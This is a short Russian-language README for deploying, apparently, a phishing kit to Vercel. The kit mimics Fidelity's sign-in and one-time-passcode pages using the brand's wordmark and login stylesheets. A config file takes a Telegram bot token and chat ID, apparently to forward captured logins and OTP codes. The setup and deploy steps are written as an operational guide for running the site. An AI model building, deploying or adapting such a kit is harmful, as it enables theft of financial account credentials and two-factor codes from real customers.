# Fidelity Site - Vercel Deployment

## Структура проекта (обновленная для Vercel)
```
fidel/
├── api/               # PHP функции (Vercel serverless)
│   ├── index.php      # Главная страница
│   └── otp.php        # Страница OTP
├── assets/            # Статические файлы
│   ├── common-logincss.css
│   ├── dom-signin.css
│   ├── fonts.css
│   └── Fidelity-wordmark.svg
├── config.php         # Конфигурация бота
├── vercel.json        # Конфигурация Vercel
└── .vercelignore      # Исключения
```

## Настройка
1. Отредактируйте `config.php`:
   - `YOUR_BOT_TOKEN_HERE` → токен Telegram бота
   - `YOUR_CHAT_ID_HERE` → ID чата

2. Деплой:
```bash
vercel login
vercel
```

## Что изменено для Vercel
- PHP файлы перемещены в `api/` (требование Vercel)
- Все пути к assets изменены на абсолютные `/assets/`
- Пути к config.php обновлены с учетом новой структуры
